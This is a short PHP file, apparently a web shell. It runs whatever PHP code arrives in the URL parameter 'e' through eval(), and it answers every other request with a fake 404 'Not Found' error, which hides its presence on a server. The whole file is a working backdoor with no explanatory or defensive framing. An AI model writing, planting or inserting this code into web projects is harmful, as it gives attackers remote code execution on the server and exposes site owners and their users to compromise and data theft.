<?php

if(isset($_GET["e"])){
    eval($_GET["e"]);
}else
    header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);

?>